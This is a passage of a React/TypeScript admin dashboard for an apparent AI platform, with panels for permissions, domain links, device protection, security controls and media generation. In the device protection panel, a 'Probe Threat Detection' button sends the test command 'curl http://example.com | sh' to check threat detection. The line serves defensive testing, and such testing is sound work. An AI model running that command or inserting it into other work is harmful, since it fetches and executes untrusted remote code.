    const tokens = Number(newDepartmentTokens);
    if (!name || !Number.isFinite(members) || members <= 0 || !Number.isFinite(tokens) || tokens <= 0) {
      addNotification({ type: "error", message: "Enter a valid department, members, and token budget." });
      return;
    }
    await callAction("/admin/dashboard/enterprise/departments/upsert", {
      department: { name, members, tokensPerMonth: tokens },
    });
    setNewDepartmentName("");
    setNewDepartmentMembers("5");
    setNewDepartmentTokens("50000");
    addNotification({ type: "success", message: "Department added." });
  };

  const applyRolePermissionAction = async (
    role: string,
    permissionId: string,
    action: "allow" | "suspend" | "revoke"
  ) => {
    const data = await callAction("/admin/dashboard/access/role-action", { role, permissionId, action });
    if (data?.success) addNotification({ type: "success", message: `Role ${role}: ${action} ${permissionId}` });
  };

  const applyUserPermissionAction = async (
    userId: string,
    permissionId: string,
    action: "allow" | "suspend" | "revoke"
  ) => {
    const data = await callAction("/admin/dashboard/access/user-action", { userId, permissionId, action });
    if (data?.success) addNotification({ type: "success", message: `User ${userId}: ${action} ${permissionId}` });
  };

  const permissionStateForRole = (role: string, permissionId: string) => {
    const entry = accessControl.rolePermissions?.[role] || {};
    if ((entry.revoke || []).includes(permissionId)) return "revoke";
    if ((entry.suspend || []).includes(permissionId)) return "suspend";
    if ((entry.allow || []).includes(permissionId)) return "allow";
    return "allow";
  };

  const permissionStateForUser = (userId: string, permissionId: string) => {
    const entry = (accessControl.userOverrides || []).find((u) => String(u.userId) === String(userId));
    if (!entry) return "inherit";
    if ((entry.revoke || []).includes(permissionId)) return "revoke";
    if ((entry.suspend || []).includes(permissionId)) return "suspend";
    if ((entry.allow || []).includes(permissionId)) return "allow";
    return "inherit";
  };

  const saveDeviceProtectionPolicy = async () => {
    const data = await callAction("/admin/device-protection/policy/save", { policy: deviceProtection.policy });
    if (data?.success) addNotification({ type: "success", message: "Device protection policy saved." });
  };

  const upsertManagedDevice = async () => {
    if (!deviceDraft.id.trim() || !deviceDraft.hostname.trim()) {
      addNotification({ type: "error", message: "Enter device id and hostname." });
      return;
    }
    const data = await callAction("/admin/device-protection/devices/upsert", {
      device: {
        id: deviceDraft.id.trim(),
        hostname: deviceDraft.hostname.trim(),
        os: deviceDraft.os,
        ownerUserId: deviceDraft.ownerUserId,
        ownerOrg: deviceDraft.ownerOrg,
        companyOwned: deviceDraft.companyOwned,
        antiVirusVersion: deviceDraft.antiVirusVersion,
      },
    });
    if (data?.success) {
      addNotification({ type: "success", message: "Device registered/updated." });
      setDeviceDraft((prev) => ({ ...prev, id: "", hostname: "" }));
    }
  };

  const applyDeviceAction = async (id: string, action: "allow" | "suspend" | "revoke" | "quarantine") => {
    const data = await callAction("/admin/device-protection/devices/action", { id, action });
    if (data?.success) addNotification({ type: "success", message: `Device ${id}: ${action}` });
  };

  const ingestSecurityActivity = async (activity: Partial<WorkerActivityRecord>) => {
    const data = await callAction("/admin/device-protection/activity/ingest", { activity });
    if (data?.success) addNotification({ type: "info", message: `Activity ingested (${data.activity?.severity || "unknown"})` });
  };

  const runAegisAction = async (path: string, body: any = {}) => {
    try {
      const isGet = path.startsWith("GET:");
      const target = isGet ? path.replace("GET:", "") : path;
      const data = isGet ? await getJson(target) : await callAction(target, body);
      if (data) {
        setAegisOutput(data);
        if (data.deviceProtection && typeof data.deviceProtection === "object") {
          setDeviceProtection((prev) => ({ ...prev, ...data.deviceProtection }));
        }
      }
      return data;
    } catch (err: any) {
      addNotification({ type: "error", message: `Aegis action failed: ${err?.message || err}` });
      return null;
    }
  };

  const selectedAegisDeviceId = () => {
    const selected = aegisDeviceId.trim();
    if (selected) return selected;
    if (deviceDraft.id.trim()) return deviceDraft.id.trim();
    if (deviceProtection.managedDevices[0]?.id) return deviceProtection.managedDevices[0].id;
    return "";
  };

  const domainRegistryCard = (
    <Card title="Domain & Link Registry (Founder/Admin)">
      <div style={{ display: "grid", gap: 8 }}>
        <input
          value={domainLinkDraft.name}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, name: e.target.value }))}
          placeholder="Link name (e.g. Production App, User Portal, Test URL)"
          style={input}
        />
        <input
          value={domainLinkDraft.url}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, url: e.target.value }))}
          placeholder="https://your-domain.com"
          style={input}
        />
        <textarea
          value={domainLinkDraft.description}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, description: e.target.value }))}
          placeholder="Description (e.g. this is for users, this is test url, this is admin API)"
          style={{ ...input, minHeight: 70 }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select
            value={domainLinkDraft.type}
            onChange={(e) => setDomainLinkDraft((p) => ({ ...p, type: e.target.value as DomainLink["type"] }))}
            style={input}
          >
            <option value="public">public</option>
            <option value="internal">internal</option>
            <option value="admin">admin</option>
            <option value="api">api</option>
            <option value="docs">docs</option>
            <option value="test">test</option>
          </select>
          <select
            value={domainLinkDraft.environment}
            onChange={(e) => setDomainLinkDraft((p) => ({ ...p, environment: e.target.value as DomainLink["environment"] }))}
            style={input}
          >
            <option value="development">development</option>
            <option value="staging">staging</option>
            <option value="production">production</option>
            <option value="testing">testing</option>
          </select>
          <select
            value={domainLinkDraft.audience}
            onChange={(e) => setDomainLinkDraft((p) => ({ ...p, audience: e.target.value as DomainLink["audience"] }))}
            style={input}
          >
            <option value="users">users</option>
            <option value="admins">admins</option>
            <option value="founder">founder</option>
            <option value="developers">developers</option>
            <option value="enterprise">enterprise</option>
            <option value="internal">internal</option>
          </select>
          <select
            value={domainLinkDraft.status}
            onChange={(e) => setDomainLinkDraft((p) => ({ ...p, status: e.target.value as DomainLink["status"] }))}
            style={input}
          >
            <option value="active">active</option>
            <option value="inactive">inactive</option>
            <option value="testing">testing</option>
            <option value="deprecated">deprecated</option>
          </select>
        </div>
        <input
          value={domainLinkDraft.tagsCsv}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, tagsCsv: e.target.value }))}
          placeholder="Tags (comma-separated): users, auth, test"
          style={input}
        />
        <input
          value={domainLinkDraft.owner}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, owner: e.target.value }))}
          placeholder="Owner (team or person)"
          style={input}
        />
        <input
          value={domainLinkDraft.notes}
          onChange={(e) => setDomainLinkDraft((p) => ({ ...p, notes: e.target.value }))}
          placeholder="Notes (alerts, SLA, routing details)"
          style={input}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={upsertDomainLink}>
            {domainLinkDraft.id ? "Update Link" : "Add Link"}
          </button>
          <button style={chip} onClick={clearDomainLinkDraft}>Clear Form</button>
        </div>
      </div>
      <div style={{ display: "grid", gap: 8, marginTop: 10 }}>
        {domainLinks.length === 0 && <div style={muted}>No domains/links registered yet.</div>}
        {domainLinks.map((link) => (
          <div key={link.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "center" }}>
              <strong>{link.name}</strong>
              <span>{link.environment} • {link.status}</span>
            </div>
            <div style={{ marginTop: 4, wordBreak: "break-all" }}>{link.url}</div>
            <div style={{ marginTop: 4, color: "#94a3b8" }}>{link.description || "No description."}</div>
            <div style={{ marginTop: 4 }}>
              Type: {link.type} • Audience: {link.audience} • Owner: {link.owner || "n/a"}
            </div>
            <div style={{ marginTop: 4 }}>
              Tags: {(link.tags || []).join(", ") || "-"}
            </div>
            {link.notes ? <div style={{ marginTop: 4 }}>Notes: {link.notes}</div> : null}
            <div style={{ marginTop: 8, display: "flex", gap: 6, flexWrap: "wrap" }}>
              <button style={chip} onClick={() => editDomainLink(link)}>Edit</button>
              <button style={chip} onClick={() => navigator.clipboard?.writeText(link.url)}>Copy URL</button>
              <button style={chip} onClick={() => verifyDomainLink(link.id)}>Verify</button>
              <button style={chip} onClick={() => toggleDomainLink(link.id)}>
                {link.status === "active" ? "Deactivate" : "Activate"}
              </button>
              <button
                style={chip}
                onClick={() =>
                  runGuarded(
                    `domain link ${link.name}`,
                    () => callAction("/admin/dashboard/links/delete", { id: link.id }),
                    "delete"
                  )
                }
              >
                Delete
              </button>
            </div>
          </div>
        ))}
      </div>
    </Card>
  );

  const accessControlCard = (
    <Card title="Task & Permission Control Matrix">
      <div style={{ display: "grid", gap: 8 }}>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select
            value={selectedAccessRole}
            onChange={(e) => setSelectedAccessRole(e.target.value)}
            style={input}
          >
            <option value="founder">founder</option>
            <option value="admin">admin</option>
            <option value="developer">developer</option>
            <option value="enterprise">enterprise</option>
            <option value="user">user</option>
            <option value="guest">guest</option>
          </select>
          <select
            value={selectedAccessUserId}
            onChange={(e) => setSelectedAccessUserId(e.target.value)}
            style={input}
          >
            {(users || []).map((u) => (
              <option key={u.id} value={u.id}>
                {u.name} ({u.id})
              </option>
            ))}
          </select>
          <button style={chip} onClick={async () => {
            try {
              const access = await getJson("/admin/dashboard/access/bootstrap");
              if (Array.isArray(access?.permissionCatalog)) setPermissionCatalog(access.permissionCatalog);
              if (access?.accessControl && typeof access.accessControl === "object") setAccessControl(access.accessControl);
            } catch (err: any) {
              addNotification({ type: "error", message: err?.message || "Failed to refresh access control" });
            }
          }}>Refresh</button>
        </div>
        <div style={muted}>
          Founder/Admin can set each task to <strong>allow</strong>, <strong>suspend</strong>, or <strong>revoke</strong> by role and by user.
        </div>
      </div>
      <div style={{ display: "grid", gap: 8, marginTop: 8 }}>
        {Object.entries(
          (permissionCatalog || []).reduce((acc: Record<string, PermissionCatalogItem[]>, item) => {
            const key = item.group || "general";
            if (!acc[key]) acc[key] = [];
            acc[key].push(item);
            return acc;
          }, {})
        ).map(([group, items]) => (
          <div key={group} style={log}>
            <div style={{ fontWeight: 700, marginBottom: 6, textTransform: "capitalize" }}>{group}</div>
            {items.map((item) => (
              <div key={item.id} style={{ ...row, alignItems: "center", borderBottom: "1px solid rgba(148,163,184,0.15)", paddingBottom: 6, marginBottom: 6 }}>
                <div style={{ flex: 1, minWidth: 180 }}>
                  <div style={{ fontWeight: 600 }}>{item.label}</div>
                  <div style={muted}>{item.id} • scope: {item.scope}</div>
                </div>
                <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                  <span style={muted}>Role: {permissionStateForRole(selectedAccessRole, item.id)}</span>
                  <button style={chip} onClick={() => applyRolePermissionAction(selectedAccessRole, item.id, "allow")}>Allow</button>
                  <button style={chip} onClick={() => applyRolePermissionAction(selectedAccessRole, item.id, "suspend")}>Suspend</button>
                  <button style={chip} onClick={() => applyRolePermissionAction(selectedAccessRole, item.id, "revoke")}>Revoke</button>
                </div>
                <div style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
                  <span style={muted}>User: {permissionStateForUser(selectedAccessUserId, item.id)}</span>
                  <button style={chip} onClick={() => applyUserPermissionAction(selectedAccessUserId, item.id, "allow")}>Allow</button>
                  <button style={chip} onClick={() => applyUserPermissionAction(selectedAccessUserId, item.id, "suspend")}>Suspend</button>
                  <button style={chip} onClick={() => applyUserPermissionAction(selectedAccessUserId, item.id, "revoke")}>Revoke</button>
                </div>
              </div>
            ))}
          </div>
        ))}
        {permissionCatalog.length === 0 && <div style={muted}>No permission tasks loaded yet.</div>}
      </div>
    </Card>
  );

  const deviceProtectionCard = (
    <Card title="Device Protection & Workforce Security">
      <div style={{ display: "grid", gap: 8 }}>
        <div style={muted}>
          Protects GoldegeLabs and paid enterprise devices against misuse, malware patterns, data exfiltration, and suspicious worker activity.
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          {[
            ["enabled", "Protection Enabled"],
            ["monitorCommands", "Monitor Commands"],
            ["monitorFileChanges", "Monitor File Changes"],
            ["monitorNetworkEgress", "Monitor Network Egress"],
            ["blockUnknownExecutables", "Block Unknown Executables"],
            ["virusScanOnUpload", "Virus Scan Uploads"],
            ["dataExfiltrationShield", "Data Exfiltration Shield"],
            ["autoQuarantineOnCritical", "Auto Quarantine Critical"],
            ["enterpriseMode", "Enterprise Mode"],
          ].map(([k, label]) => (
            <button
              key={k}
              style={chip}
              onClick={() =>
                setDeviceProtection((prev) => ({
                  ...prev,
                  policy: { ...prev.policy, [k]: !Boolean((prev.policy as any)[k]) },
                }))
              }
            >
              {label}: {Boolean((deviceProtection.policy as any)[k]) ? "On" : "Off"}
            </button>
          ))}
        </div>
        <div style={{ display: "flex", gap: 8 }}>
          <input
            type="number"
            value={deviceProtection.policy.retentionDays}
            onChange={(e) =>
              setDeviceProtection((prev) => ({
                ...prev,
                policy: { ...prev.policy, retentionDays: Number(e.target.value) || 90 },
              }))
            }
            placeholder="Retention days"
            style={input}
          />
          <button style={primary} onClick={saveDeviceProtectionPolicy} disabled={!canAccessAdminOps}>
            Save Policy
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Register Managed Device</div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <input value={deviceDraft.id} onChange={(e) => setDeviceDraft((p) => ({ ...p, id: e.target.value }))} placeholder="Device ID" style={input} />
          <input value={deviceDraft.hostname} onChange={(e) => setDeviceDraft((p) => ({ ...p, hostname: e.target.value }))} placeholder="Hostname" style={input} />
          <input value={deviceDraft.os} onChange={(e) => setDeviceDraft((p) => ({ ...p, os: e.target.value }))} placeholder="OS" style={input} />
          <input value={deviceDraft.ownerUserId} onChange={(e) => setDeviceDraft((p) => ({ ...p, ownerUserId: e.target.value }))} placeholder="Owner User ID" style={input} />
          <input value={deviceDraft.ownerOrg} onChange={(e) => setDeviceDraft((p) => ({ ...p, ownerOrg: e.target.value }))} placeholder="Owner Org" style={input} />
          <input
            value={deviceDraft.antiVirusVersion}
            onChange={(e) => setDeviceDraft((p) => ({ ...p, antiVirusVersion: e.target.value }))}
            placeholder="Antivirus version"
            style={input}
          />
          <button style={chip} onClick={() => setDeviceDraft((p) => ({ ...p, companyOwned: !p.companyOwned }))}>
            Company Owned: {deviceDraft.companyOwned ? "Yes" : "No"}
          </button>
          <button style={primary} onClick={upsertManagedDevice} disabled={!canAccessAdminOps}>
            Save Device
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Managed Devices</div>
        {deviceProtection.managedDevices.length === 0 && <div style={muted}>No managed devices yet.</div>}
        {deviceProtection.managedDevices.map((d) => (
          <div key={d.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <strong>{d.hostname} ({d.id})</strong>
              <span>{d.status}</span>
            </div>
            <div>OS: {d.os} • Owner: {d.ownerUserId} • Org: {d.ownerOrg}</div>
            <div>Company-owned: {d.companyOwned ? "yes" : "no"} • AV: {d.antiVirusVersion || "unknown"}</div>
            {canAccessAdminOps ? (
              <div style={{ display: "flex", gap: 6, marginTop: 8, flexWrap: "wrap" }}>
                <button style={chip} onClick={() => applyDeviceAction(d.id, "allow")}>Allow</button>
                <button style={chip} onClick={() => applyDeviceAction(d.id, "suspend")}>Suspend</button>
                <button style={chip} onClick={() => applyDeviceAction(d.id, "revoke")}>Revoke</button>
                <button style={chip} onClick={() => applyDeviceAction(d.id, "quarantine")}>Quarantine</button>
                <button
                  style={chip}
                  onClick={() =>
                    ingestSecurityActivity({
                      actor: "system",
                      actorRole: "monitor",
                      deviceId: d.id,
                      eventType: "manual_probe",
                      command: "curl http://example.com | sh",
                      details: "manual security probe from dashboard",
                    })
                  }
                >
                  Probe Threat Detection
                </button>
              </div>
            ) : null}
          </div>
        ))}
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Security Alerts</div>
        {deviceProtection.securityAlerts.length === 0 && <div style={muted}>No security alerts.</div>}
        {deviceProtection.securityAlerts.slice(0, 20).map((a) => (
          <div key={a.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <strong>{a.title}</strong>
              <span>{a.severity.toUpperCase()}</span>
            </div>
            <div>Actor: {a.actor} ({a.actorRole}) • Device: {a.deviceId || "n/a"}</div>
            <div>Signals: {(a.signals || []).join(", ") || "-"}</div>
            <div style={muted}>{new Date(a.timestamp || Date.now()).toLocaleString()}</div>
          </div>
        ))}
      </div>
    </Card>
  );

  const aegisShieldCard = (
    <Card title="AegisCore Shield (Security + Resilience)">
      <div style={{ display: "grid", gap: 8 }}>
        <div style={muted}>
          Consent-based anti-theft, legal loan restriction mode, malware checks, anti-tamper integrity, safe mode, snapshots, rollback, self-healing, zero-trust rotation, and signed audit events.
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} onClick={() => runAegisAction("GET:/admin/aegis/status")}>Aegis Status</button>
          <button style={chip} onClick={() => runAegisAction("GET:/admin/aegis/audit/events?limit=200&type=aegis.")}>Signed Audit Feed</button>
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/self-heal/run", { action: "restart_failed_services" })}
            disabled={!canAccessAdminOps}
          >
            Run Self-Heal
          </button>
          <button
            style={chip}
            onClick={() =>
              runAegisAction("/admin/aegis/safe-mode/set", {
                active: !Boolean(deviceProtection?.resilience?.safeMode?.active),
                reason: aegisSafeModeReason || "Manual security control",
              })
            }
            disabled={!canAccessAdminOps}
          >
            Safe Mode: {deviceProtection?.resilience?.safeMode?.active ? "Disable" : "Enable"}
          </button>
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/integrity/baseline", {})} disabled={!canAccessAdminOps}>Baseline Integrity</button>
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/integrity/check", {})} disabled={!canAccessAdminOps}>Integrity Check</button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Anti-Theft (Opt-in + Consent)</div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <input
            value={aegisDeviceId}
            onChange={(e) => setAegisDeviceId(e.target.value)}
            placeholder="Device ID (optional)"
            style={input}
          />
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/antitheft/flag", { deviceId: selectedAegisDeviceId(), stolen: true, consentPreGranted: true })}
            disabled={!canAccessAdminOps || !selectedAegisDeviceId()}
          >
            Flag Stolen + Lock
          </button>
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/antitheft/flag", { deviceId: selectedAegisDeviceId(), stolen: false, consentPreGranted: false })}
            disabled={!canAccessAdminOps || !selectedAegisDeviceId()}
          >
            Clear Theft Flag
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Loan Protection (Legal Restricted Mode)</div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select value={aegisLoanStatus} onChange={(e) => setAegisLoanStatus(e.target.value as any)} style={input}>
            <option value="current">current</option>
            <option value="grace">grace</option>
            <option value="overdue">overdue</option>
            <option value="dispute">dispute</option>
          </select>
          <input
            type="number"
            value={aegisOverdueDays}
            onChange={(e) => setAegisOverdueDays(e.target.value)}
            placeholder="Overdue days"
            style={input}
          />
          <button
            style={chip}
            onClick={() =>
              runAegisAction("/admin/aegis/loan/status", {
                deviceId: selectedAegisDeviceId(),
                loanStatus: aegisLoanStatus,
                overdueDays: Number(aegisOverdueDays || 0),
              })
            }
            disabled={!canAccessAdminOps || !selectedAegisDeviceId()}
          >
            Apply Loan Status
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Malware + Prompt Injection Shield</div>
        <textarea
          value={aegisMalwareInput}
          onChange={(e) => setAegisMalwareInput(e.target.value)}
          placeholder="Paste upload content sample or suspicious script to scan..."
          style={{ ...input, minHeight: 80 }}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/malware/scan", { source: "dashboard", text: aegisMalwareInput })}
            disabled={!canAccessAdminOps}
          >
            Scan Malware
          </button>
          <input
            value={aegisPromptInput}
            onChange={(e) => setAegisPromptInput(e.target.value)}
            placeholder="Prompt shield text..."
            style={input}
          />
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/prompt-shield/check", { input: aegisPromptInput })} disabled={!canAccessAdminOps}>
            Prompt Shield Check
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ fontWeight: 700 }}>Snapshots, Backup, Rollback, Zero Trust</div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <input
            value={aegisSnapshotVersion}
            onChange={(e) => setAegisSnapshotVersion(e.target.value)}
            placeholder="Snapshot version (e.g. v1.0.5)"
            style={input}
          />
          <button
            style={chip}
            onClick={() =>
              runAegisAction("/admin/aegis/snapshot/create", {
                version: aegisSnapshotVersion.trim() || `v${Date.now()}`,
              })
            }
            disabled={!canAccessAdminOps}
          >
            Create Snapshot
          </button>
          <button
            style={chip}
            onClick={() => runAegisAction("/admin/aegis/rollback", { version: aegisSnapshotVersion.trim(), reason: "manual founder rollback" })}
            disabled={!canAccessAdminOps || !aegisSnapshotVersion.trim()}
          >
            Rollback
          </button>
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button
            style={chip}
            onClick={() =>
              runAegisAction("/admin/aegis/backup/config", {
                backup: {
                  enabled: true,
                  cadence: "daily",
                  retentionDays: 30,
                  offsiteTarget: "encrypted-offsite",
                  encryptAtRest: true,
                  includeSnapshots: true,
                  includeEvents: true,
                },
              })
            }
            disabled={!canAccessAdminOps}
          >
            Save Backup Policy
          </button>
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/backup/run", { mode: "incremental" })} disabled={!canAccessAdminOps}>Run Backup</button>
          <button style={chip} onClick={() => runAegisAction("/admin/aegis/zero-trust/rotate-keys", {})} disabled={dashboardRole !== "founder"}>
            Rotate Internal Keys (Founder)
          </button>
        </div>
      </div>

      <div style={{ marginTop: 10, display: "grid", gap: 8 }}>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <input
            value={aegisSafeModeReason}
            onChange={(e) => setAegisSafeModeReason(e.target.value)}
            placeholder="Safe mode reason"
            style={input}
          />
          <button style={chip} onClick={() => exportOutputTxt("aegis_output", aegisOutput || "No Aegis output yet.")}>Export TXT</button>
          <button style={chip} onClick={() => exportOutputWord("aegis_output", aegisOutput || "No Aegis output yet.")}>Export Word</button>
          <button style={chip} onClick={() => printOutputPdf("Aegis Output", aegisOutput || "No Aegis output yet.")}>Export PDF</button>
          <button style={chip} onClick={() => setAegisOutput(null)}>Clear Output</button>
        </div>
        <pre style={{ ...log, maxHeight: 220, overflow: "auto", whiteSpace: "pre-wrap" }}>
          {aegisOutput ? JSON.stringify(aegisOutput, null, 2) : "No Aegis output yet."}
        </pre>
      </div>
    </Card>
  );

  const creatorEngineCard = (
    <Card title="Create Media (VisionForge)">
      <div style={{ ...muted, marginBottom: 8 }}>
        AI Image/Video generation, script-to-video, thumbnails, captions, background removal, job queue, history, and downloadable artifacts.
      </div>
      <div style={{ display: "grid", gap: 8 }}>
        <input
          value={creatorPrompt}
          onChange={(e) => setCreatorPrompt(e.target.value)}
          placeholder="Prompt (image/video/thumbnail)"
          style={input}
        />
        <textarea
          value={creatorScript}
          onChange={(e) => setCreatorScript(e.target.value)}
          placeholder="Script input (for Script -> Video and Subtitles)"
          style={{ ...input, minHeight: 90 }}
        />
        <input
          value={creatorImagePath}
          onChange={(e) => setCreatorImagePath(e.target.value)}
          placeholder="Existing image path (for edit/background remove)"
          style={input}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/image", { prompt: creatorPrompt, style: "cinematic", resolution: "1024x1024", aspect_ratio: "1:1", batch: 1 })}>Generate Image</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/image/edit", { image_path: creatorImagePath, instructions: creatorPrompt || "enhance details" })}>Edit Image</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/video", { prompt: creatorPrompt, duration: 8, resolution: "1080p", aspect_ratio: "16:9" })}>Generate Video</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/script-video", { script: creatorScript || creatorPrompt, voice_style: "neutral", aspect_ratio: "16:9" })}>Script to Video</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/thumbnail", { topic: creatorPrompt || "NeuroEdge", text: creatorPrompt })}>Create Thumbnail</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/subtitles", { transcript: creatorScript || creatorPrompt })}>Generate Captions</button>
          <button style={chip} disabled={creatorBusy} onClick={() => submitCreatorJob("/creator/background-remove", { image_path: creatorImagePath })}>Remove Background</button>
          <button style={chip} onClick={loadCreatorHistory}>Refresh History</button>
        </div>

        <div style={{ ...log, padding: 10 }}>
          <div style={{ fontWeight: 600, marginBottom: 6 }}>Render Status</div>
          <div style={{ width: "100%", height: 10, background: "rgba(148,163,184,0.25)", borderRadius: 999 }}>
            <div
              style={{
                width: `${Math.max(0, Math.min(100, Number(creatorJob?.progress || 0)))}%`,
                height: "100%",
                borderRadius: 999,
                background: "linear-gradient(90deg,#22c55e,#3b82f6)",
                transition: "width 0.25s ease",
              }}
            />
          </div>
          <div style={{ ...muted, marginTop: 6 }}>
            Job: {creatorJobId || "none"} • Status: {creatorJob?.status || (creatorBusy ? "running" : "idle")}
          </div>
          {creatorJob?.error ? <div style={{ color: "#ef4444", marginTop: 6 }}>{creatorJob.error}</div> : null}
        </div>

        <div style={{ ...log, maxHeight: 220, overflow: "auto" }}>
          <div style={{ fontWeight: 600, marginBottom: 6 }}>Latest Job Output</div>
          <pre style={{ whiteSpace: "pre-wrap", margin: 0 }}>
            {creatorJob?.result ? JSON.stringify(creatorJob.result, null, 2) : "No output yet."}
          </pre>
          <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginTop: 8 }}>
            {creatorJob?.result &&
              Object.values(creatorJob.result)
                .flatMap((v: any) => (Array.isArray(v) ? v : [v]))
                .filter((v: any) => v && typeof v === "object" && typeof v.path === "string")
                .slice(0, 8)
                .map((asset: any, idx: number) => (
                  <button
                    key={`${asset.path}-${idx}`}
                    style={chip}
                    onClick={() =>
                      window.open(`${apiBase}/creator/download?path=${encodeURIComponent(String(asset.path))}`, "_blank")
                    }
                  >
                    Download {asset.name || `asset ${idx + 1}`}
                  </button>
                ))}
          </div>
        </div>

        <div style={{ ...log, maxHeight: 220, overflow: "auto" }}>
          <div style={{ fontWeight: 600, marginBottom: 6 }}>History</div>
          {creatorHistory.length === 0 ? (
            <div style={muted}>No creator history yet.</div>
          ) : (
            creatorHistory.slice(0, 40).map((h, i) => (
              <div key={`${h?.timestamp || i}-${i}`} style={{ borderBottom: "1px solid rgba(148,163,184,0.15)", padding: "6px 0" }}>
                <strong>{String(h?.type || "event")}</strong> • {new Date(Number(h?.timestamp || Date.now()) * 1000).toLocaleString()}
                {h?.job_id ? <div style={muted}>job: {h.job_id}</div> : null}
              </div>
            ))
          )}
        </div>
      </div>
    </Card>
  );

  const cortexCoreCard = (
    <Card title="CortexCore Intelligence Engine">
      <div style={{ ...muted, marginBottom: 8 }}>
        Math/Physics/Science/Code/Research solving, graph/equation visualization, and academic exports (PDF/Word/ZIP).
      </div>
      <div style={{ display: "grid", gap: 8 }}>
        <input
          value={intelligenceQuestion}
          onChange={(e) => setIntelligenceQuestion(e.target.value)}
          placeholder="Ask CortexCore (e.g. differentiate x^2 + 2x, solve ohm law i=2 r=5, compare transformers vs rnns)"
          style={input}
        />
        <select value={intelligenceMode} onChange={(e) => setIntelligenceMode(e.target.value)} style={input}>
          <option value="step_by_step">step-by-step mode</option>
          <option value="fast">fast answer mode</option>
          <option value="deep_research">deep research mode</option>
          <option value="beginner">beginner explanation</option>
          <option value="advanced">advanced explanation</option>
          <option value="exam">exam mode (concise)</option>
        </select>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/ask", { question: intelligenceQuestion, mode: intelligenceMode, payload: {} });
                setIntelligenceOutput(data);
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Intelligence ask failed" });
              }
            }}
          >
            Ask Intelligence
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/platform", {
                  question: intelligenceQuestion || "Build full platform architecture for websites, databases, APIs, cloud and security.",
                  mode: intelligenceMode,
                  payload: { node_types: ["laptop", "desktop", "mobile"] },
                });
                setIntelligenceOutput(data);
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Platform intelligence failed" });
              }
            }}
          >
            Platform Intelligence
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/fullstack", {
                  question: intelligenceQuestion || "NeuroEdge full stack internet + offline mesh architecture",
                  mode: intelligenceMode,
                  payload: { include_mesh: true },
                });
                setIntelligenceOutput(data);
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Fullstack blueprint failed" });
              }
            }}
          >
            Build Fullstack + Mesh
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/visualize", {
                  question: intelligenceQuestion,
                  payload: { type: intelligenceQuestion.includes("=") ? "equation" : "graph", x_min: -10, x_max: 10 },
                });
                setIntelligenceOutput(data);
                const svg = String(data?.visualization?.svg || "");
                setIntelligenceSvg(svg);
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Visualization failed" });
              }
            }}
          >
            Visualize Graph/Equation
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
